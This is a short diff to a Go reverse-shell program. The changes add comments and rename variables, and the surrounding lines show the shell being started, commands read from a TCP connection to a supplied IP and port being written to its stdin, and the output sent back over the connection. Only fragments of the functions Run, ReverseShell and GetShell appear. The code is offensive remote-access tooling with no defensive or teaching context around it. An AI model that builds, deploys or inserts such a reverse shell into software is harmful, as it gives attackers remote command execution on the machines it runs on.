@@ -42,6 +42,7 @@ func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
 			select {
 			case remoteCommand := <-rx:
 				log.Printf("remote command: %v", string(remoteCommand))
+				// execute the remoteCommand
 				stdin.Write(remoteCommand)
 			}
 		}
@@ -57,7 +58,7 @@ func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
 		}
 	}()
 
-	// Read the stdout of the shell and write the output to the connection
+	// Read the stdout of the shell and write the output to the tx channel
 	cmd.Start()
 	for {
 		buf := make([]byte, buffer)
@@ -97,13 +98,14 @@ func ReverseShell(ip, port string) {
 	// Read data from the tx chan and write it back to tcp connection
 	for {
 		select {
-		case outgoing := <-tx:
-			conn.Write(outgoing)
+		case commandResult := <-tx:
+			conn.Write(commandResult)
 		}
 	}
 
 }
 
+// Detect where the reverse shell will be running
 func GetShell() string {
 	switch os := runtime.GOOS; os {
 	case "linux":
@@ -125,6 +127,7 @@ func GetShell() string {
 	return ""
 }
 
+// Check if the shell path exists
 func exists(path string) bool {
 	if _, err := os.Stat(path); os.IsNotExist(err) {
 		return false
